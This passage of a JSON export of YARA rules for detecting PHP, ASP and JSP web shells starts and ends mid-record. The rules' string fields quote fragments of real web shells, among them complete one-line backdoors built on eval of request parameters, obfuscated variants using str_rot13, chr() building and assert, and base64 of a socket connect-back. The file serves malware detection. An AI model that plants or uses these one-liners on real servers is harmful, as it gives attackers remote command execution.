s.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_RID2D62","reference":"-","required_modules":[],"rule_hash":"ef49567df458dc7467bad2330331b64e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99_php_c_RID3299 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"ext_avi\\\"=>array(\\\"ext_avi\\\",\\\"ext_mov\\\",\\\"ext_mvi\" \n      $s1 = \"echo \\\"<b>Execute file:</b><form action=\\\\\\\"\\\".$surl.\\\"\\\\\\\" method=POST><inpu\" \n      $s2 = \"\\\"ext_htaccess\\\"=>array(\\\"ext_htaccess\\\",\\\"ext_htpasswd\" \n   condition: \n      1 of them\n}","date":"2014-03-29 14:12:01","description":"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99_php_c_RID3299","reference":"-","required_modules":[],"rule_hash":"983feefe34d938d7dd87dd9526c6f66a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_multiple_php_webshells_RID33E1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files multiple_php_webshells\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI\" \n      $s2 = \"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0\" \n      $s4 = \"A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg\" \n   condition: \n      2 of them\n}","date":"2014-03-29 15:06:41","description":"Semi-Auto-generated - from files multiple_php_webshells","minimum_yara":"1.7","name":"Webshell_multiple_php_webshells_RID33E1","reference":"-","required_modules":[],"rule_hash":"40043c79942f4fdac240752066560c3e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99madshell_v2_RID2FCC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<b>Dumped! Dump has been writed to \" \n      $s1 = \"if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \\\"<TABLE st\" \n      $s2 = \"<input type=submit name=actarcbuff value=\\\\\\\"Pack buffer to archive\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:12:31","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt","minimum_yara":"1.7","name":"Webshell_c99madshell_v2_RID2FCC","reference":"-","required_modules":[],"rule_hash":"8a3ea0d41750d24520651c9fc416b720","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99madshell_v2_1_RID305C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@ini_set(\\\"highlight\" fullword\n      $s1 = \"echo \\\"<b>Result of execution this PHP-code</b>:<br>\\\";\" fullword\n      $s2 = \"{$row[] = \\\"<b>Owner/Group</b>\\\";}\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 12:36:31","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt","minimum_yara":"1.7","name":"Webshell_c99madshell_v2_1_RID305C","reference":"-","required_modules":[],"rule_hash":"4cd370556f92383a4785a462c79296c4","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_GFS_web_shell_ver_3_1_7_RID32FE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:28:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo $uname.\\\"</font><br><b>\\\";\" fullword\n      $s3 = \"while(!feof($f)) { $res.=fread($f,1024); }\" fullword\n      $s4 = \"echo \\\"user=\\\".@get_current_user().\\\" uid=\\\".@getmyuid().\\\" gid=\\\".@getmygid()\" \n   condition: \n      2 of them\n}","date":"2014-03-29 14:28:51","description":"Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt","minimum_yara":"1.7","name":"Webshell_GFS_web_shell_ver_3_1_7_RID32FE","reference":"-","required_modules":[],"rule_hash":"7bb145b7877dfc1206fe93a637d68a38","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99shell_v1_0_99_RID2FF9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:20:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c99ftpbrutecheck\" \n      $s1 = \"$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);\" fullword\n      $s2 = \"$fqb_lenght = $nixpwdperpage;\" fullword\n      $s3 = \"$sock = @ftp_connect($host,$port,$timeout);\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 12:20:01","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_c99shell_v1_0_99_RID2FF9","reference":"-","required_modules":[],"rule_hash":"bee0874fa73137a54db30cce325376a3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99d_RID3094 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sqlquicklaunch[] = array(\\\"\" \n      $s1 = \"else {echo \\\"<center><b>File does not exists (\\\".htmlspecialchars($d.$f).\\\")!<\" \n   condition: \n      all of them\n}","date":"2014-03-29 12:45:51","description":"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99d_RID3094","reference":"-","required_modules":[],"rule_hash":"7537792708c503bc0e74a34e04bfe387","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Fatalshell_php_RID304D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(@$_POST['save'])writef($file,$_POST['data']);\" fullword\n      $s1 = \"if($action==\\\"phpeval\\\"){\" fullword\n      $s2 = \"$uploadfile = $dirupload.\\\"/\\\".$_POST['filename'];\" fullword\n      $s3 = \"$dir=getcwd().\\\"/\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 12:34:01","description":"Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt","minimum_yara":"1.7","name":"Webshell_Fatalshell_php_RID304D","reference":"-","required_modules":[],"rule_hash":"5e161a2593b908528348c012c3c9dfed","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Crystal_php_nshell_RID3214 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if ($filename != \\\".\\\" and $filename != \\\"..\\\"){\" fullword\n      $s1 = \"$dires = $dires . $directory;\" fullword\n      $s4 = \"$arr = array_merge($arr, glob(\\\"*\\\"));\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 13:49:51","description":"Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt","minimum_yara":"1.7","name":"Webshell_Crystal_php_nshell_RID3214","reference":"-","required_modules":[],"rule_hash":"c1a03efe1675d593f9108cd96583448a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_nst_php_cybershell_RID322E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@$rto=$_POST['rto'];\" fullword\n      $s2 = \"SCROLLBAR-TRACK-COLOR: #91AAFF\" fullword\n      $s3 = \"$to1=str_replace(\\\"//\\\",\\\"/\\\",$to1);\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 13:54:11","description":"Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt","minimum_yara":"1.7","name":"Webshell_nst_php_cybershell_RID322E","reference":"-","required_modules":[],"rule_hash":"6a8c264aefbc7e8960610e58bada86b1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99_php_php_a_RID343E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if ($total === FALSE) {$total = 0;}\" fullword\n      $s1 = \"$free_percent = round(100/($total/$free),2);\" fullword\n      $s2 = \"if (!$bool) {$bool = is_dir($letter.\\\":\\\\\\\\\\\");}\" fullword\n      $s3 = \"$bool = $isdiskette = in_array($letter,$safemode_diskettes);\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 15:22:11","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99_php_php_a_RID343E","reference":"-","required_modules":[],"rule_hash":"99cb2910ffee953cf6106e85af0b0213","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_spy_2_RID2FAE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$res = mssql_query(\\\"select * from r57_temp_table\\\",$db);\" fullword\n      $s2 = \"'eng_text30'=>'Cat file',\" fullword\n      $s3 = \"@mssql_query(\\\"drop table r57_temp_table\\\",$db);\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 12:07:31","description":"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_spy_2_RID2FAE","reference":"-","required_modules":[],"rule_hash":"b2c3481854c2fa4f9fa24ee07c6e613f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$num = $nixpasswd + $nixpwdperpage;\" fullword\n      $s1 = \"$ret = posix_kill($pid,$sig);\" fullword\n      $s2 = \"if ($uid) {echo join(\\\":\\\",$uid).\\\"<br>\\\";}\" fullword\n      $s3 = \"$i = $nixpasswd;\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 14:42:31","description":"Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt","minimum_yara":"1.7","name":"Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350","reference":"-","required_modules":[],"rule_hash":"ffb0670cce0f2393933d727cd431b8c0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_con2_RID31E9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file con2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:42:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e\" \n      $s10 = \"j \\\"<Form action='\\\"&URL&\\\"?Action2=Post' method='post' name='EditForm'><input n\" \n   condition: \n      1 of them\n}","date":"2014-03-28 13:42:41","description":"Web shells - generated from file con2.asp","minimum_yara":"1.7","name":"Webshell_webshells_new_con2_RID31E9","reference":"-","required_modules":[],"rule_hash":"a36d4d3f138577f7535ee187d42fda77","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_make2_RID3247 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file make2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:58:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"error_reporting(0);session_start();header(\\\"Content-type:text/html;charset=utf-8\" \n   condition: \n      all of them\n}","date":"2014-03-28 13:58:21","description":"Web shells - generated from file make2.php","minimum_yara":"1.7","name":"Webshell_webshells_new_make2_RID3247","reference":"-","required_modules":[],"rule_hash":"34df9c4ec232fb1a10ffe8d6863aba45","score":50,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_php2_RID31F1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $s=@$_GET[2];if(md5($s.$s)==\" \n   condition: \n      all of them\n}","date":"2014-03-28 13:44:01","description":"Web shells - generated from file php2.php","minimum_yara":"1.7","name":"Webshell_webshells_new_php2_RID31F1","reference":"-","required_modules":[],"rule_hash":"5919fd92ad4ff8e7d234e4d40f858674","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_bypass_iisuser_p_RID316A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file bypass-iisuser-p.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:21:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%Eval(Request(chr(112))):Set fso=CreateObject\" \n   condition: \n      all of them\n}","date":"2014-03-28 13:21:31","description":"Web shells - generated from file bypass-iisuser-p.asp","minimum_yara":"1.7","name":"Webshell_bypass_iisuser_p_RID316A","reference":"-","required_modules":[],"rule_hash":"2b081d5bb88e869eaccd23f15df333f3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_pppp_RID3237 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file pppp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:55:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mail: chinese@hackermail.com\" fullword\n      $s3 = \"if($_GET[\\\"hackers\\\"]==\\\"2b\\\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \" \n      $s6 = \"Site: http://blog.weili.me\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:55:41","description":"Web shells - generated from file pppp.php","minimum_yara":"1.7","name":"Webshell_webshells_new_pppp_RID3237","reference":"-","required_modules":[],"rule_hash":"d1d31a6cdb7d3c3566794fc116e66288","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_jspyyy_RID332F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file jspyyy.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:37:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*\\\"%><%if(request.getParameter(\\\"f\\\")\" \n   condition: \n      all of them\n}","date":"2014-03-28 14:37:01","description":"Web shells - generated from file jspyyy.jsp","minimum_yara":"1.7","name":"Webshell_webshells_new_jspyyy_RID332F","reference":"-","required_modules":[],"rule_hash":"d9356a77bc082dba40d0d6739114206f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_xxxx_RID3257 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file xxxx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:01:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval($_POST[1]);?>  \" fullword\n   condition: \n      all of them\n}","date":"2014-03-28 14:01:01","description":"Web shells - generated from file xxxx.php","minimum_yara":"1.7","name":"Webshell_webshells_new_xxxx_RID3257","reference":"-","required_modules":[],"rule_hash":"4cd5e43e5a341bb16db760e16ab31a3f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_JJjsp3_RID328B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file JJjsp3.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:09:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\\\"%><%!S\" \n   condition: \n      all of them\n}","date":"2014-03-28 14:09:41","description":"Web shells - generated from file JJjsp3.jsp","minimum_yara":"1.7","name":"Webshell_webshells_new_JJjsp3_RID328B","reference":"-","required_modules":[],"rule_hash":"6fe9a9179356c9045bece9b2f829cf9e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_radhat_RID32EB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file radhat.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 14:25:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sod=Array(\\\"D\\\",\\\"7\\\",\\\"S\" \n   condition: \n      all of them\n}","date":"2014-03-28 14:25:41","description":"Web shells - generated from file radhat.asp","minimum_yara":"1.7","name":"Webshell_webshells_new_radhat_RID32EB","reference":"-","required_modules":[],"rule_hash":"384efd1929555c6fe3b4219912372d80","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_asp1_RID31EC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file asp1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:43:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave \" fullword\n      $s2 = \" <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:43:11","description":"Web shells - generated from file asp1.asp","minimum_yara":"1.7","name":"Webshell_webshells_new_asp1_RID31EC","reference":"-","required_modules":[],"rule_hash":"e079161464a7785ed2fd8592a402f132","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_php6_RID31F5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php6.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"array_map(\\\"asx73ert\\\",(ar\" \n      $s3 = \"preg_replace(\\\"/[errorpage]/e\\\",$page,\\\"saft\\\");\" fullword\n      $s4 = \"shell.php?qid=zxexp  \" fullword\n   condition: \n      1 of them\n}","date":"2014-03-28 13:44:41","description":"Web shells - generated from file php6.php","minimum_yara":"1.7","name":"Webshell_webshells_new_php6_RID31F5","reference":"-","required_modules":[],"rule_hash":"358a63ea7cfd8f2f234dcbc8bcf601d4","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_xxx_RID31DF : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file xxx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<?php array_map(\\\"ass\\\\x65rt\\\",(array)$_REQUEST['expdoor']);?>\" fullword\n   condition: \n      all of them\n}","date":"2014-03-28 13:41:01","description":"Web shells - generated from file xxx.php","minimum_yara":"1.7","name":"Webshell_webshells_new_xxx_RID31DF","reference":"-","required_modules":[],"rule_hash":"a46ab07174fd1ca02f07ea098f1942d3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_GetPostpHp_RID2E94 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file GetPostpHp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 11:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>\" fullword\n   condition: \n      all of them\n}","date":"2014-03-28 11:20:31","description":"Web shells - generated from file GetPostpHp.php","minimum_yara":"1.7","name":"Webshell_GetPostpHp_RID2E94","reference":"-","required_modules":[],"rule_hash":"d26460d63f484f8927f10028c29545b6","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_php5_RID31F4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file php5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:44:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u\" \n   condition: \n      all of them\n}","date":"2014-03-28 13:44:31","description":"Web shells - generated from file php5.php","minimum_yara":"1.7","name":"Webshell_webshells_new_php5_RID31F4","reference":"-","required_modules":[],"rule_hash":"4ffdf192bc710da48c0cb074622a4e14","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshells_new_aaa_RID319A : DEMO T1100 